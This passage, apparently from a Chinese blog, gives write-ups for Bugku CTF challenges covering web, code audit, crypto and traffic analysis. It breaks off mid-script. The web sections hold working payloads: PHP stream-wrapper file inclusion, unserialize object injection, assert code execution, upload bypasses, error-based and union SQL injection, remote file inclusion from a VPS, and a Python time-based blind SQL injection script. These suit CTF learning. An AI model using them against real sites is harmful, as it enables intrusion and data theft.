face=\"futura\">php://input</font></strong>是个可以访问请求的原始数据的只读流，一般用来获取POST请求。<br>对于<font face=\"futura\">id</font>的处理有代码可知，如果提交id=0，那么前面 <font face=\"futura\">$_GET[‘id’]</font>会被判断为空，无法从而使代码exit。所以可以用<code>id=00</code>或者<code>id=%00</code>绕过(字符串0在PHP中会被当做空值)<br>函数<code>eregi()</code>现已被弃用，存在%00截断漏洞，读到<code>%00</code>的时候，判断就截止了。</p>\n</blockquote>\n<h2 id=\"welcome-to-bugkuctf\"><a href=\"#welcome-to-bugkuctf\" class=\"headerlink\" title=\"welcome to bugkuctf\"></a>welcome to bugkuctf</h2><p>访问元素发现源代码<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$user = $_GET[<span class=\"string\">\"txt\"</span>];  </span><br><span class=\"line\">$file = $_GET[<span class=\"string\">\"file\"</span>];  </span><br><span class=\"line\">$pass = $_GET[<span class=\"string\">\"password\"</span>];  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class=\"string\">'r'</span>)===<span class=\"string\">\"welcome to the bugkuctf\"</span>))&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"hello admin!&lt;br&gt;\"</span>;  </span><br><span class=\"line\">    <span class=\"keyword\">include</span>($file); <span class=\"comment\">//hint.php  </span></span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"you are not admin ! \"</span>;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>text的绕过可以使用php的input协议流，file的话用PHP的filter过滤器即可<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?txt&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;hint.php</span><br></pre></td></tr></table></figure><br>读取到一段base64代码，解码得到PHP代码<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">class Flag&#123;&#x2F;&#x2F;flag.php  </span><br><span class=\"line\">    public $file;  </span><br><span class=\"line\">    public function __tostring()&#123;  </span><br><span class=\"line\">        if(isset($this-&gt;file))&#123;  </span><br><span class=\"line\">            echo file_get_contents($this-&gt;file); </span><br><span class=\"line\">\t\t\techo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">\t\treturn (&quot;good&quot;);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure><br>发现这是一个flag类，有个string方法，序列化即可使之执行。payload<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?txt&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;hint.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"过狗一句话\"><a href=\"#过狗一句话\" class=\"headerlink\" title=\"过狗一句话\"></a>过狗一句话</h2><p>查看源代码可知已经构造了assert语句，这个对于我来说是一个新知识点。assert和eval类似，可以进行命令执行，只是eval参数为字符串，而assert参数则为函数或表达式。构造命令来执行<br><code>?s=var_dump(glob(‘*‘))</code></p>\n<blockquote>\n<p>函数<font face=\"futura\">glob(pattern，flag)</font>可以匹配所有符合条件的文件</p>\n</blockquote>\n<p>读取文件<br><code>?s=var_dump(file(‘./flag.txt’))</code></p>\n<h2 id=\"字符？正则？\"><a href=\"#字符？正则？\" class=\"headerlink\" title=\"字符？正则？\"></a>字符？正则？</h2><p>这个正则表达式后面我得好好学一下了，有点菜。靠着百度大概搞懂了，介绍一些</p>\n<blockquote>\n<p><strong><font face=\"futura\">[[:punct:]]</font></strong>为匹配任意字符，非字母和数字，<strong><font face=\"futura\">.*</font></strong>为匹配任意字符，<strong><font face=\"futura\">{m,n}</font></strong>为匹配字符m-n次，按照要求构造payload</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;key.keyaaaaakey:&#x2F;a&#x2F;keya%</span><br></pre></td></tr></table></figure>\n<h2 id=\"前女友-SKCTF\"><a href=\"#前女友-SKCTF\" class=\"headerlink\" title=\"前女友(SKCTF)\"></a>前女友(SKCTF)</h2><p>查看页面可知，是一段单身狗的诉说，查看元素发现竟然藏了一条链接，点击发现代码<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;</span><br><span class=\"line\">    $v1 &#x3D; $_GET[&#39;v1&#39;];</span><br><span class=\"line\">    $v2 &#x3D; $_GET[&#39;v2&#39;];</span><br><span class=\"line\">    $v3 &#x3D; $_GET[&#39;v3&#39;];</span><br><span class=\"line\">    if($v1 !&#x3D; $v2 &amp;&amp; md5($v1) &#x3D;&#x3D; md5($v2))&#123;</span><br><span class=\"line\">        if(!strcmp($v3, $flag))&#123;</span><br><span class=\"line\">            echo $flag;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure></p>\n<p>很简单的绕过<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?v1&#x3D;240610708&amp;v2&#x3D;QNKCDZO&amp;v3[]&#x3D;1</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"login1-SKCTF\"><a href=\"#login1-SKCTF\" class=\"headerlink\" title=\"login1(SKCTF)\"></a>login1(SKCTF)</h2><p>看提示可知本题是SQL约束攻击，具体原理查看<a href=\"http://blog.csdn.net/qq_32400847/article/details/54137747\" target=\"_blank\" rel=\"noopener\">传送门</a>，创建一个用户</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">用户名</th>\n<th style=\"text-align:center\">admin                                                1</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">密码</td>\n<td style=\"text-align:center\">Aa123456</td>\n</tr>\n</tbody>\n</table>\n</div>\n<p>注册成功后用<code>admin</code>为用户名， <code>Aa123456</code>登录即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">SKCTF&#123;4Dm1n_HaV3_GreAt_p0w3R&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"你从哪里来\"><a href=\"#你从哪里来\" class=\"headerlink\" title=\"你从哪里来\"></a>你从哪里来</h2><p>题目提示<font face=\"futura\">are you from google?</font>，我以为是说浏览器，但实际上是说<strong><font face=\"futura\">HTTP_REFERER</font></strong>，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。然后就是抓包发送即可，构造的referrer：<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;www.google.com</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"md5-collision\"><a href=\"#md5-collision\" class=\"headerlink\" title=\"md5 collision\"></a><font face=\"futura\">md5 collision</font></h2><p>这题是简单的md5哈希的比较<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?a&#x3D;240610708</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"各种绕过\"><a href=\"#各种绕过\" class=\"headerlink\" title=\"各种绕过\"></a>各种绕过</h2><p>这题很简单，直接上payload<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;margin&amp;uname[]&#x3D;1</span><br><span class=\"line\">passwd[]&#x3D;123</span><br></pre></td></tr></table></figure><br>注意第二行为post数据。</p>\n<h2 id=\"web8\"><a href=\"#web8\" class=\"headerlink\" title=\"web8\"></a>web8</h2><p>代码审计与绕过<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">extract($_GET);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($ac))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">$f = trim(file_get_contents($fn));</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($ac === $f)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;p&gt;This is flag:\"</span> .<span class=\"string\">\" $flag&lt;/p&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;p&gt;sorry!&lt;/p&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure><br>要绕过的核心语句是<code>$ac===$f</code>，可以令 <code>ac=flag</code>，<code>fn</code>处使用之前说过的PHP的input协议，本题payload<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?ac&#x3D;flag&amp;fn&#x3D;php:&#x2F;&#x2F;input</span><br></pre></td></tr></table></figure><br>再post数据<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"细心\"><a href=\"#细心\" class=\"headerlink\" title=\"细心\"></a>细心</h2><p>看了一点提示，有点不好。这题一看页面没什么东西，随便尝试旁站robots.txt(就是这一步我没有做，唉，经验不足啊),扫描发现有个<code>resusl.php</code>页面，直接是<code>x=admin</code>即可(考验脑洞的时刻)</p>\n<h2 id=\"求getshell\"><a href=\"#求getshell\" class=\"headerlink\" title=\"求getshell\"></a>求getshell</h2><p>对于getshell的题目做的不是很多，真的是有点迷。抓包更改后缀为 <code>php2,php4.php5</code>，测试发现php5可用，然后再把文件类型改一下</p>\n<blockquote>\n<p>content-type: image/jpg</p>\n</blockquote>\n<p>还得改个东西</p>\n<blockquote>\n<p>Content-Type: Multipart/form-data; boundary=—————————————-265001916915724 </p>\n</blockquote>\n<p>把第一个<strong><font face=\"futura\">m</font></strong>大写，有关介绍看个<a href=\"http://blog.csdn.net/five3/article/details/7181521\" target=\"_blank\" rel=\"noopener\">链接</a>,这种绕过有点冷门，再放个<a href=\"https://www.tuicool.com/articles/vmuYz23?utm_medium=hao.caibaojian.com&amp;utm_source=hao.caibaojian.com\" target=\"_blank\" rel=\"noopener\">链接2</a></p>\n<hr>\n<h2 id=\"INSERT-INTO注入\"><a href=\"#INSERT-INTO注入\" class=\"headerlink\" title=\"INSERT INTO注入\"></a>INSERT INTO注入</h2><p>这个题又让我学到了新知识，还顺便加强了一波脚本编写，本题考察的是 <strong><font face=\"futura\">insert into注入</font></strong>，为什么存在注入呢</p>\n<p>查看源代码，发现<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ip_arr = explode(<span class=\"string\">','</span>, $ip);</span><br></pre></td></tr></table></figure></p>\n<p>这句话一出， 说明<code>，</code>就被过滤了，所以这题是一道不能使用逗号的注入，而且报错什么的都不行，所以只能延时盲注。由于本题逗号被过滤了，所以if函数不能用了，在此<strong>解锁一个新姿势</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select substring((select user()) from 1 for 1);  #第一种方法</span><br><span class=\"line\">select substring((select user()) from -1);  #第二种方法</span><br></pre></td></tr></table></figure><br>如此就可以不用逗号截取字符串</p>\n<p>对于判断条件，可以使用<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select case when (条件) then 代码1 else 代码 2 end</span><br></pre></td></tr></table></figure><br>这个前面数据库有介绍。<br>所以对于本题有两种payload：<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">insert into xs values(12&#39;+(select case when binary substr((select flag from flag) from 1 for 1)&#x3D;&#39;e&#39; then sleep(5) else sleep(0) end) and &#39;a&#39;&#x3D;&#39;a&#39;)</span><br><span class=\"line\">insert into xs values(12&#39;+(select case when binary substr((select flag from flag) from -1)&#x3D;&#39;e&#39; then sleep(5) else sleep(0) end) and &#39;a&#39;&#x3D;&#39;a&#39;)</span><br></pre></td></tr></table></figure></p>\n<p>再介绍一个<strong>绕过逗号</strong>的姿势：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select id,ip from client_ip where 1&gt;2  union select * from  ( (select user())a JOIN  (select version())b );  --这个用于union 查询的注入</span><br></pre></td></tr></table></figure>\n<p>接下来就是写脚本了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"http://120.24.86.145:8002/web15/\"</span></span><br><span class=\"line\">data = <span class=\"string\">\"12'+(select case when binary substr((select flag from flag) from &#123;&#125; for 1)='&#123;&#125;' then sleep(5) else 1 end) and 'a'='a\"</span> </span><br><span class=\"line\">flag = <span class=\"string\">''</span></span><br><span class=\"line\">start = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">35</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> string.ascii_letters + string.digits:</span><br><span class=\"line\">\t\t<span class=\"keyword\">try</span>:</span><br><span class=\"line\">\t\t\theaders = &#123;<span class=\"string\">\"x-forwarded-for\"</span>:data.format(str(start),item)&#125;</span><br><span class=\"line\">\t\t\tres = requests.get(url,headers=headers,timeout=<span class=\"number\">3</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">except</span> requests.exceptions.ReadTimeout:</span><br><span class=\"line\">\t\t\tflag += item</span><br><span class=\"line\">\t\t\tstart += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\tprint(flag)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<hr>\n<h2 id=\"这是一个神奇的登录框\"><a href=\"#这是一个神奇的登录框\" class=\"headerlink\" title=\"这是一个神奇的登录框\"></a>这是一个神奇的登录框</h2><p>尝试输入 <code>“</code>，发现有报错，可以报错注入。而且题目什么都没有过滤。</p>\n<p>ed6b28e684817d9efcaf802979e57ae<br>ed6b28e684817d9efcaf802979e57aea<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">admin_name&#x3D;admin&amp;admin_passwd&#x3D;afd&quot; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1)%23</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">admin_name&#x3D;admin&amp;admin_passwd&#x3D;afd&quot; and updatexml(1,concat(0x7e,(select flag1 from flag1),0x7e),1)%23</span><br></pre></td></tr></table></figure>\n<p>用这种方法的出来的flag不对，因为该错误返回的值长度不足，可以再用下列子句截出<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">admin_name&#x3D;admin&amp;admin_passwd&#x3D;afd&quot; and updatexml(1,concat(0x7e,substr((select flag1 from flag1),3,30),0x7e),1)%23</span><br></pre></td></tr></table></figure></p>\n<p>也可以联合注入<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">admin_name&#x3D;admin&amp;admin_passwd&#x3D;af&quot; union select flag1,2 from flag1%23</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"多次\"><a href=\"#多次\" class=\"headerlink\" title=\"多次\"></a>多次</h2><p>这个题学到了新东西，题目很不错。这个题目过滤了许多关键字<br>刚开始输入 <code>?id=1’</code>页面返回错误(但不是报错信息)，添加 <code>?id=1’%23</code>则没有报错，继续尝试 <code>?id=1’ and 1=1%23</code>则又开始报错了，猜测可能是存在过滤，但不知道过滤的是什么。找到一个<strong><font face=\"futura\">异或注入</font></strong>的方法</p>\n<hr>\n<p>在<strong><font face=\"futura\">id</font></strong>后面输入 <code>1’^(0)^’</code>，此时页面正常返回，如果换一下 <code>‘^(1)^’</code>，此时则会返回错误，那么接下来我们就可以试一下页面究竟过滤了那些关键字。比如 <code>1’^(length(‘select’)!=6)^’</code>如果被过滤则返回错误，没有被过滤就返回正确。<br>如此可以测得多个变量被过滤</p>\n<blockquote>\n<font face=\"futura\">select,union,or,and</font>\n\n</blockquote>\n<p>但是<strong><font face=\"futura\">from,where，order</font></strong>等变量没有被过滤。在尝试一下 <code>1’^(length(‘selselectect’)!=6)^’</code>页面返回正确，说明可以通过这种方法绕过。那接下里就开始常规操作。</p>\n<hr>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39; oorrder by 3%23   # 爆字段数</span><br><span class=\"line\">?id&#x3D;-1&#39; ununionion seleselectct 1,database() %23</span><br></pre></td></tr></table></figure>\n<p>注意<em>information</em>的绕过。<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1&#39; ununionion seleselectct 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema&#x3D;database()%23</span><br></pre></td></tr></table></figure></p>\n<p>最后得到下一个页面的地址<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1&#39; ununionion seleselectct 1,group_concat(address) from flag1%23</span><br></pre></td></tr></table></figure></p>\n<p>到了新页面之后，发现有报错，也会显示你的SQL语句，很简单就能看出很多都被过滤了，不过直接用报错就行了<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1&#39; and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)%23</span><br></pre></td></tr></table></figure></p>\n<p>看别人的payload使用了<strong><font face=\"futura\">locate()</font></strong>函数</p>\n<h1 id=\"代码审计\"><a href=\"#代码审计\" class=\"headerlink\" title=\"代码审计\"></a>代码审计</h1><h2 id=\"strcmp比较字符串-1\"><a href=\"#strcmp比较字符串-1\" class=\"headerlink\" title=\"strcmp比较字符串\"></a>strcmp比较字符串</h2><p>提交数组即可绕过 <code>?a[]=1</code></p>\n<h2 id=\"数组返回NULL绕过\"><a href=\"#数组返回NULL绕过\" class=\"headerlink\" title=\"数组返回NULL绕过\"></a>数组返回NULL绕过</h2><p>也是提交数组 <code>?password[]=123</code> ,因为题目中的函数都是只能处理字符串，如果传入的是数组则会报错返回 <code>NULL</code>达到绕过的效果。</p>\n<h2 id=\"变量覆盖\"><a href=\"#变量覆盖\" class=\"headerlink\" title=\"变量覆盖\"></a>变量覆盖</h2><p>看代码可知，$c获取的是输入流里面的值，因为$b是字符串，所以获取的是控制，故只需要相应的输入空值即可。</p>\n<h2 id=\"简单的waf\"><a href=\"#简单的waf\" class=\"headerlink\" title=\"简单的waf\"></a>简单的waf</h2><p>没做出来，记录一下思路</p>\n<p>题目代码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$a=<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">\"a\"</span>])?$_GET[<span class=\"string\">\"a\"</span>]:<span class=\"string\">''</span>;</span><br><span class=\"line\">$b=<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">\"b\"</span>])?$_GET[<span class=\"string\">\"b\"</span>]:<span class=\"string\">''</span>;</span><br><span class=\"line\">$c=<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">\"c\"</span>])?$_GET[<span class=\"string\">\"c\"</span>]:<span class=\"string\">''</span>;</span><br><span class=\"line\">$d=<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">\"d\"</span>])?$_GET[<span class=\"string\">\"d\"</span>]:<span class=\"string\">''</span>;</span><br><span class=\"line\">$e=<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'e'</span>])?$_GET[<span class=\"string\">'e'</span>]:<span class=\"string\">''</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/php/i'</span>, $a))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">\"This not allow pseudo protocol!\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/\\.\\./'</span>, $a))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">\"This also not allow!\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>((file_get_contents($a,<span class=\"string\">'r'</span>)===$b)&amp;&amp;(file_get_contents($e,<span class=\"string\">'r'</span>)===<span class=\"string\">\"I'm Administrator!\"</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"hello admin!&lt;br&gt;\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/flag/\"</span>,$c))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"不能现在就给你flag哦\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">include</span>($c);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/base64/'</span>, $d))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"No! you can't use it!\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $d = unserialize($d);</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $d;</span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"you are not admin ! &lt;br&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>首先变量a中不能出现php://等字段，显示我们不能使用PHP伪协议，但是这里可以远程文件包含，我们可以在自己的vps上写一个文件，然后a参数远程包含，再让b参数等于我们的文本内容就可了，对于e参数我们同样可以利用远程文件包含，在自己的vps上新建一个txt文件写入 <code>I&#39;m Administrator!</code> 即可，payload如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;120.24.86.145:9010?a&#x3D;http:&#x2F;&#x2F;vps_ip&#x2F;index.html&amp;b&#x3D;&lt;a&gt;Hello World&lt;&#x2F;a&gt;%0a&amp;e&#x3D;http:&#x2F;&#x2F;vps_ip&#x2F;a.txt</span><br></pre></td></tr></table></figure>\n<p>说一下坑点，在使用vim编辑文件的时候，他会默认在文件末尾添加一个换行符，这也是为什么b参数后面要添加一个 <code>%0a(换行符)</code> ，但是在e参数对应的代码中的 <code>I&#39;m Administrator!</code> 可是没有换行符的，怎么办呢？百度找到了一个方法：</p>\n<blockquote>\n<p>1、进入vim前，增加-b参数<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">vim -b a.txt</span><br></pre></td></tr></table></figure><br>2、进入命令行模式，开启 set noeol<br>这样就不会在文件末尾添加换行符了。</p>\n</blockquote>\n<p>c参数和d参数个人感觉思路是c参数包含一个PHP文件，然后d参数反序列化读取，题目还有一个flag.php文件，所以c参数应该就是要包含该文件，题目过滤了flag，可以用大写绕过 <code>Flag.php</code> ，但是这里应该有一个类来反序列化才对，我感觉应该是通过文件泄露来获取，但是尝试了好多次都不行，直接访问flag，会下载到一个文件，信息为</p>\n<blockquote>\n<p>please call admin to get flag</p>\n</blockquote>\n<p>不知道这是什么意思，题目到这儿就卡住了，所以payload只有</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;120.24.86.145:9010&#x2F;?a&#x3D;http:&#x2F;&#x2F;vps_ip&#x2F;index.html&amp;b&#x3D;&lt;a&gt;Hello%20World&lt;&#x2F;a&gt;%0a&amp;e&#x3D;http:&#x2F;&#x2F;vps_ip&#x2F;a.txt&amp;c&#x3D;Flag.php</span><br></pre></td></tr></table></figure>\n<h1 id=\"加密\"><a href=\"#加密\" class=\"headerlink\" title=\"加密\"></a>加密</h1><h2 id=\"滴答-滴\"><a href=\"#滴答-滴\" class=\"headerlink\" title=\"滴答 ~ 滴\"></a>滴答 ~ 滴</h2><p>摩斯解密可得<code>bkctfmisc</code>，提交即可,注意全部大写。</p>\n<h2 id=\"聪明的小羊\"><a href=\"#聪明的小羊\" class=\"headerlink\" title=\"聪明的小羊\"></a>聪明的小羊</h2><p>栅栏解密</p>\n<h2 id=\"ok\"><a href=\"#ok\" class=\"headerlink\" title=\"ok\"></a>ok</h2><p>这段密文是一种ook语言，直接在线跑一下即可</p>\n<h2 id=\"这不是摩斯密码\"><a href=\"#这不是摩斯密码\" class=\"headerlink\" title=\"这不是摩斯密码\"></a>这不是摩斯密码</h2><p>brainfuck代码，在上一题那个网站跑一下即可。</p>\n<h2 id=\"散乱的密文\"><a href=\"#散乱的密文\" class=\"headerlink\" title=\"散乱的密文\"></a>散乱的密文</h2><blockquote>\n<p>lf5{ag024c483549d7fd@@1}<br>一张纸条上凌乱的写着2 1 6 5 3 4</p>\n</blockquote>\n<p>刚开始看到{前面有三位以为明文应该是key，顺着这个思路往下想，结果不对，后面注意到密文的2，1两位翻转一下是fl，6，5两位加上就是flag，于是再把3,4位放到原来5,6位的位置，那么前六位就是 <code>flag{5</code> ，我们可以看到前六位进行的调整分别是1，2位交换位置，5,6位交换到3,4位顺序不变，3,4位调整到5,6位但是位置交换一下，于是把每六位分成一组，每组按照前述的方法做变换，最终可以得到flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#123;52048c453d794df1&#125;@@</span><br></pre></td></tr></table></figure>\n<h2 id=\"贝斯家族\"><a href=\"#贝斯家族\" class=\"headerlink\" title=\"贝斯家族\"></a>贝斯家族</h2><p>base91解码</p>\n<h1 id=\"社工\"><a href=\"#社工\" class=\"headerlink\" title=\"社工\"></a>社工</h1><h2 id=\"密码\"><a href=\"#密码\" class=\"headerlink\" title=\"密码\"></a>密码</h2><p>根据生日姓名等猜测<code>zs19970315</code></p>\n<h2 id=\"王晓明的日记\"><a href=\"#王晓明的日记\" class=\"headerlink\" title=\"王晓明的日记\"></a>王晓明的日记</h2><p>利用bugku在线密码生成工具生成密码字典测试一下即可</p>\n<h1 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h1><h2 id=\"flag被盗\"><a href=\"#flag被盗\" class=\"headerlink\" title=\"flag被盗\"></a>flag被盗</h2><p>过滤条件 <code>http contains &quot;flag&quot;</code>，在第二条数据中即发现了flag</p>\n<h2 id=\"抓到一只苍蝇\"><a href=\"#抓到一只苍蝇\" class=\"headerlink\" title=\"抓到一只苍蝇\"></a>抓到一只苍蝇</h2><p>首先查看一下http请求，在第一个就发现</p>\n<p><img src=\"/2018/03/12/bugkuwriteup/1.png\" alt></p>\n<p>本能的感觉这题和这个fly.rar应该有点关系，所以过滤一下 ‘http contains “fly.rar”‘</p>\n<p><img src=\"/2018/03/12/bugkuwriteup/2.png\" alt></p>\n<p>看到了题目的提示内容，感觉走对了，这个包应该是QQ邮箱的包，所以肯定是走post请求的，过滤一下获取rar文件包 <code>http.request.method == POST</code></p>\n<p>可以看到从第二个到第六个正式rar的文件内容，但是这五个文件的总长度却比fly.rar要大，应该有多余的头部，计算一下头部长度</p>\n<blockquote>\n<p>(527521bytes – 525701bytes) / 5 =  364 bytes</p>\n</blockquote>\n<p>把每个一次导出，然后用hxd去掉头部364字节，之后再合并一下</p>\n<p><img src=\"/2018/03/12/bugkuwriteup/3.png\" alt></p>\n<p>可以看到md5值是正确的，证明我们得到了正确的fly.rar文件，但是解压时却要求输入密码，猜测是伪加密，将文件头0x1674后面的84改为80。（84为加密，80/20不加密），解密之后有个TXT文件，binwalk，foremost一下，在图片中找到一个二维码，扫码即可得到flag。</p>\n<h2 id=\"信息提取\"><a href=\"#信息提取\" class=\"headerlink\" title=\"信息提取\"></a>信息提取</h2><p>给的数据包是sqlmap注入的一个数据包，题目的意思是让我们从sqlmap的payload中恢复出数据，数据包的最后部分就是数据的记录，吧这部分分出来保存为a.pcap，将关键信息存入txt文件中</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># import scapy</span></span><br><span class=\"line\"><span class=\"comment\"># from scapy.all import *</span></span><br><span class=\"line\"><span class=\"comment\"># from scapy.utils import PcapReader</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># pcaps = rdpcap(\"a.pcap\")</span></span><br><span class=\"line\"><span class=\"comment\"># file = open('1.txt','wb')</span></span><br><span class=\"line\"><span class=\"comment\"># for i in range(476):</span></span><br><span class=\"line\"><span class=\"comment\"># \tfile.write(pcaps[i]['Raw'].load)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将流量包字段信息导出，之后在用sublime过滤只留下请求内容和response长度，示例如下</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># GET 